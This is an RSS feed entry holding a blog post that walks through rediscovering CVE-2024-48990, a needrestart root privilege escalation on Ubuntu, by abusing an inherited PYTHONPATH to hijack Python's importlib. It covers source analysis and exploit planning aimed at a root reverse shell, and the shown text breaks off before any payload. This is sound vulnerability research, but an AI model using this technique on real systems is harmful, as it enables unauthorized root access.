<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>CVE on Ally Petitt</title>
    <link>https://ally-petitt.com:443/en/tags/cve/</link>
    <description>Recent content in CVE on Ally Petitt</description>
    <generator>Hugo -- 0.123.7</generator>
    <language>en</language>
    <lastBuildDate>Mon, 25 Nov 2024 00:00:00 +0000</lastBuildDate>
    <atom:link href="https://ally-petitt.com:443/en/tags/cve/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Rediscovering CVE-2024-48990 and Crafting My Own Exploit</title>
      <link>https://ally-petitt.com:443/en/posts/2024-12-25_rediscovering-cve-2024-48990-and-crafting-my-own-exploit/</link>
      <pubDate>Mon, 25 Nov 2024 00:00:00 +0000</pubDate>
      <guid>https://ally-petitt.com:443/en/posts/2024-12-25_rediscovering-cve-2024-48990-and-crafting-my-own-exploit/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://ally-petitt.com:443/images/ubuntu-logo.png&#34; alt=&#34;Ubuntu logo&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
&lt;p&gt;On November 19th, 2024, Qualys publicly disclosed five local privilege escalation vulnerabilities discovered in the &lt;code&gt;needrestart&lt;/code&gt; binary that comes installed by default on Ubuntu Server installations. They disclose the technical details of these &lt;a href=&#34;https://www.qualys.com/2024/11/19/needrestart/needrestart.txt&#34;&gt;here&lt;/a&gt;, however, I will be attempting to rediscover CVE-2024-48990 prior to reading the technical details based purely on the information from the CVE description and references. Then, I will create my own exploit that gives me a reverse shell as root.&lt;/p&gt;
&lt;p&gt;I have never used &lt;code&gt;needrestart&lt;/code&gt; and I have very little familiarity with Perl, so I am going in blind. Let&amp;rsquo;s find an N-day!&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TL;DR&lt;/strong&gt;: I was able to set PYTHONPATH to a location where I created a fake &lt;code&gt;importlib&lt;/code&gt; implementation that triggered a reverse shell as root via library path hijacking. The exploit files can be found on my &lt;a href=&#34;https://github.com/ally-petitt/CVE-2024-48990-Exploit&#34;&gt;Github&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;becoming-familiar-with-needrestart&#34;&gt;Becoming Familiar with &lt;code&gt;needrestart&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;I will begin by cloning the &lt;code&gt;needrestart&lt;/code&gt; repository and getting a high-level overview of what it does.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git clone https://github.com/liske/needrestart
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;A glance at the &lt;a href=&#34;https://github.com/liske/needrestart/blob/master/README.md&#34;&gt;README&lt;/a&gt; reveals the purpose of &lt;code&gt;needrestart&lt;/code&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;needrestart&lt;/em&gt; checks which daemons need to be restarted after library upgrades.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;It seems that &lt;code&gt;needrestart&lt;/code&gt; is invoked by package managers via hook scripts in &lt;code&gt;/ex&lt;/code&gt; after library upgrades. Of course, package managers like &lt;code&gt;apt&lt;/code&gt; are typically executed with root privileges, which makes &lt;code&gt;needrestart&lt;/code&gt; a target for Local Privilege Escalation (LPE) vulnerabilities.&lt;/p&gt;
&lt;p&gt;I installed &lt;code&gt;needrestart&lt;/code&gt; from the Ubuntu repositories to interact with it directly.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ sudo apt install needrestart
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ needrestart --version
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;needrestart 3.6 - Restart daemons after library updates.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-- snip --
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Since this is version 3.6 and the patch was introduced in version 3.8, this &lt;code&gt;needrestart&lt;/code&gt; installation is vulnerable.&lt;/p&gt;
&lt;h1 id=&#34;tracking-down-cve-2024-48990&#34;&gt;Tracking Down CVE-2024-48990&lt;/h1&gt;
&lt;p&gt;The &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2024-48990&#34;&gt;description&lt;/a&gt; of this CVE is the following:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Qualys discovered that needrestart, before version 3.8, allows local attackers to execute arbitrary code as root by tricking needrestart into running the Python interpreter with an attacker-controlled PYTHONPATH environment variable.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Additionally, a &lt;a href=&#34;https://github.com/liske/needrestart/commit/fcc9a4401392231bef4ef5ed026a0d7a275149ab&#34;&gt;patch&lt;/a&gt; on the file &lt;code&gt;perl/lib/NeedRestart/Interp/Python.pm&lt;/code&gt; is linked in the CVE references section with the commit message &amp;ldquo;interp: do not set PYTHONPATH environment variable to prevent a LPE&amp;rdquo;. These are very substantial hints.&lt;/p&gt;
&lt;p&gt;The patched file is in the &lt;code&gt;NeedRestart::Interp::Python&lt;/code&gt; module. This module was specified in the README as a part of the &lt;code&gt;needrestart&lt;/code&gt; interpreter scanning feature, which searches for outdated source code files in Python, Ruby, Perl, and Java.&lt;/p&gt;
&lt;h2 id=&#34;pythonpath-explained&#34;&gt;PYTHONPATH explained&lt;/h2&gt;
&lt;p&gt;According to the official &lt;a href=&#34;https://docs.python.org/3/using/cmdline.html#envvar-PYTHONPATH&#34;&gt;Python documentation&lt;/a&gt;, &lt;code&gt;PYTHONPATH&lt;/code&gt; defines the default search path for module files that are imported. In fact, I have used PYTHONPATH within CTF competitions to execute my own user-controlled Python code with executed privileges via library path hijacking.&lt;/p&gt;
&lt;h2 id=&#34;pythonpath-assignment-in-needrestart&#34;&gt;PYTHONPATH Assignment in &lt;code&gt;needrestart&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;Let&amp;rsquo;s look at how &lt;code&gt;PYTHONPATH&lt;/code&gt; is being set within &lt;code&gt;needrestart&lt;/code&gt;. I will checkout to a vulnerable version of the source code to look further.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git checkout tags/v3.6
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I used the search functionality to locate where &lt;code&gt;PYTHONPATH&lt;/code&gt; is being set within the &lt;code&gt;files()&lt;/code&gt; subroutine.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://ally-petitt.com:443/images/needrestart-pythonpath.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;nr_parse_env()&lt;/code&gt; subroutine above is defined in &lt;code&gt;perl/lib/NeedRestart/Utils.pm&lt;/code&gt; and reads the &lt;code&gt;/proc/&amp;lt;pid&amp;gt;/environ&lt;/code&gt; file of the Python process that it is checking and returns an array of the environment variables used by that process.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-perl&#34; data-lang=&#34;perl&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;sub&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;nr_parse_env&lt;/span&gt;($) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;my&lt;/span&gt; $pid &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; shift;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;my&lt;/span&gt; $fh;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    open($fh, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/proc/$pid/environ&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (); &lt;span style=&#34;color:#75715e&#34;&gt;# read environment variables from environ file&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    local $/ &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\000&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;my&lt;/span&gt; @env &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;lt;$fh&amp;gt;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    chomp(@env);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    close($fh);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; map { (&lt;span style=&#34;color:#e6db74&#34;&gt;/^([^=]+)=(.*)$/&lt;/span&gt; ? ($1, $2) : ()) } @env;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Scrolling to lines 202-207 of &lt;code&gt;perl/lib/NeedRestart/Interp/Python.pm&lt;/code&gt; sheds some insight into the Python code that is executed after the &lt;code&gt;PYTHONPATH&lt;/code&gt; environment variable is set.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-perl&#34; data-lang=&#34;perl&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# get include path&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;my&lt;/span&gt; ($pyread, $pywrite) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; nr_fork_pipe2($self&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;{debug}, $ptable&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;{exec}, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;# Equivalent to `python -` on the CLI&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt; $pywrite &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;import sys\nprint(sys.path)\n&amp;#34;&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;# This code is passed into Python&amp;#39;s stdin&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    close($pywrite);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;my&lt;/span&gt; ($path) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;lt;$pyread&amp;gt;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    close($pyread);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;At a high level, this is a breakdown of the most relevant steps from the code shared so far:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;The &lt;code&gt;files()&lt;/code&gt; subroutine of the Python interpreter checker is called with the PID of a Python process as the argument.&lt;/li&gt;
&lt;li&gt;The environment variables associated with that process are parsed.
&lt;ul&gt;
&lt;li&gt;If a &lt;code&gt;PYTHONPATH&lt;/code&gt; environment variable is found, &lt;code&gt;$ENV&lt;/code&gt; is set to contain that value.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;A forked process of Python is being launched where the code &lt;code&gt;import sys\nprint(sys.path)\n&lt;/code&gt; is being executed.&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;the-env-variable&#34;&gt;The &lt;code&gt;%ENV&lt;/code&gt; Variable&lt;/h3&gt;
&lt;p&gt;As stated in the &lt;a href=&#34;https://perldoc.perl.org/Env&#34;&gt;Perl documentation&lt;/a&gt;, &amp;ldquo;Perl maintains environment variables in a special hash named %ENV&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;Even though &lt;code&gt;%ENV&lt;/code&gt; is not explicitly passed as a parameter to the child Python process that is being created by &lt;code&gt;needrestart&lt;/code&gt;, Perl will still carry over those values behind the scenes, which is why the value of &lt;code&gt;%ENV&lt;/code&gt; is significant.&lt;/p&gt;
&lt;h3 id=&#34;seed-of-an-attack-idea&#34;&gt;Seed of an Attack Idea&lt;/h3&gt;
&lt;p&gt;A potential attack strategy is forming: launch a Python process with the &lt;code&gt;PYTHONPATH&lt;/code&gt; set to an attacker-controlled directory and perform a library path hijacking attack to execute arbitrary Python code.&lt;/p&gt;
&lt;p&gt;Before we can create a proof-of-concept for this idea, however, we must first verify that we can do the following:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Trigger the Python interpreter scan to check an attacker-controlled process.&lt;/li&gt;
&lt;li&gt;Identify a Python library that can be hijacked.
&lt;ul&gt;
&lt;li&gt;The imported module &lt;code&gt;sys&lt;/code&gt; is built-in to Python and does not rely on an external module path. Since Python does not search through external files in the search path for &lt;code&gt;sys&lt;/code&gt;, we will have to be more creative with our approach.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;triggering-the-python-interpreter-check&#34;&gt;Triggering the Python Interpreter Check&lt;/h3&gt;
&lt;p&gt;As &lt;a href=&#34;https://ally-petitt.com:443/en/posts/2024-12-25_rediscovering-cve-2024-48990-and-crafting-my-own-exploit/#tracking-down-cve-2024-48990&#34;&gt;previously mentioned&lt;/a&gt;, &lt;code&gt;needrestart&lt;/code&gt; supports interpreter checks on Python, Ruby, Perl, and Java programs. These interpreter checks are iteratively invoked by the &lt;code&gt;needrestart_interp_check()&lt;/code&gt; subroutine on a given process in &lt;code&gt;perl/lib/NeedRestart.pm&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-perl&#34; data-lang=&#34;perl&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;sub&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;needrestart_interp_check&lt;/span&gt;($$$$$) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;my&lt;/span&gt; $debug &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; shift;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;my&lt;/span&gt; $pid &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; shift;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt; snip &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;foreach&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;my&lt;/span&gt; $interp (values %Interps) { &lt;span style=&#34;color:#75715e&#34;&gt;# iterate through Python, Ruby, Perl, and Java interpreter checkers&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;($interp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;isa($pid, $bin)) { &lt;span style=&#34;color:#75715e&#34;&gt;# check that argv[0] of the process is supported by the current interpreter checker&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt; snip &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	    &lt;span style=&#34;color:#66d9ef&#34;&gt;my&lt;/span&gt; %files &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $interp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;files($pid, &lt;span style=&#34;color:#f92672&#34;&gt;\&lt;/span&gt;%InterpCache); &lt;span style=&#34;color:#75715e&#34;&gt;# call the vulnerable files() subroutine on the process&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt; snip &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In turn, &lt;code&gt;needrestart_interp_check()&lt;/code&gt; is called in line 584 by the main &lt;code&gt;/needrestart&lt;/code&gt; Perl script when &lt;code&gt;$restart&lt;/code&gt; is false and &lt;code&gt;interpscan&lt;/code&gt; is not disabled by the configuration.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-perl&#34; data-lang=&#34;perl&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;unless&lt;/span&gt;($restart &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;$nrconf{interpscan}) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	    $restart&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(needrestart_interp_check($nrconf{verbosity} &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, $pid, $exe, $nrconf{blacklist_interp}, $opt_t));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Luckily, &lt;code&gt;$nrconf{interpscan}&lt;/code&gt; is enabled by default.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://ally-petitt.com:443/images/needrestart-nrconf.png&#34; alt=&#34;&amp;lt;code&amp;gt;$nrconf{interpscan}&amp;lt;/code&amp;gt; being set to 0&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;Another factor to consider is the PID that is being passed to &lt;code&gt;needrestart_interp_check()&lt;/code&gt; since that corresponds with the process that the &lt;code&gt;PYTHONPATH&lt;/code&gt; environment variable is being read from. Searching for the value of &lt;code&gt;$pid&lt;/code&gt; in &lt;code&gt;/needrestart&lt;/code&gt; reveals that the program iterates through a list of PIDs stored in &lt;code&gt;$ptable&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-perl&#34; data-lang=&#34;perl&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;my&lt;/span&gt; $ptable &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; nr_ptable();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt; snip &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;my&lt;/span&gt; $pid (sort {$a &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;lt;=&amp;gt;&lt;/span&gt; $b} keys %$ptable) {
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &lt;code&gt;$ptable&lt;/code&gt; hash is populated with a list of all process objects accessible to the user executing &lt;code&gt;needrestart&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-perl&#34; data-lang=&#34;perl&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;my&lt;/span&gt; %ptable;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    local $SIG{__WARN__} &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;sub&lt;/span&gt; {};
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    %ptable &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; map {$_&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;pid &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; $_} @{ &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Proc::ProcessTable(enable_ttys &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;table };
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;sub&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;nr_ptable&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;\&lt;/span&gt;%ptable;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This verifies that we will be able to invoke &lt;code&gt;needrestart_interp_check()&lt;/code&gt; with the PID of our malicious process since all of the processes are iterated through.&lt;/p&gt;
&lt;h1 id=&#34;exploit-development&#34;&gt;Exploit Development&lt;/h1&gt;
&lt;h2 id=&#34;flushing-out-the-plan&#34;&gt;Flushing out the Plan&lt;/h2&gt;
&lt;p&gt;Since I couldn&amp;rsquo;t do library path hijacking with the built-in &lt;code&gt;sys&lt;/code&gt; module, I thought about other options that I could target within the short Python snippet &lt;code&gt;import sys\nprint(sys.path)&lt;/code&gt; that is executed in &lt;code&gt;Python.pm&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;There are two other notable tokens aside from &lt;code&gt;sys&lt;/code&gt;: &lt;code&gt;print&lt;/code&gt; and &lt;code&gt;import&lt;/code&gt;. I decided to read more about how &lt;code&gt;import&lt;/code&gt; in the official &lt;a href=&#34;https://docs.python.org/3/reference/simple_stmts.html#import&#34;&gt;documentation&lt;/a&gt;. In particular, this snippet from the docs stood out to me:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;importlib.import_module() is provided to support applications that determine dynamically the modules to be loaded.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;It seems that using the &lt;code&gt;import&lt;/code&gt; statement in python can trigger the &lt;code&gt;importlib&lt;/code&gt; module. I used the &lt;code&gt;find&lt;/code&gt; command to verify that &lt;code&gt;importlib&lt;/code&gt; is indeed a dynamically loaded library rather than a Python built-in like &lt;code&gt;sys&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ find / -name importlib 2&amp;gt;/dev/null
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/lib/python3.12/importlib
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Maybe we can take advantage of &lt;code&gt;importlib&lt;/code&gt; being dynamically loaded along with the fact that the contents of &lt;code&gt;__init__.py&lt;/code&gt; are automatically executed when a module is loaded. I created a directory in &lt;code&gt;/tmp/needrestart&lt;/code&gt; with the following structure:&lt;/p&gt;
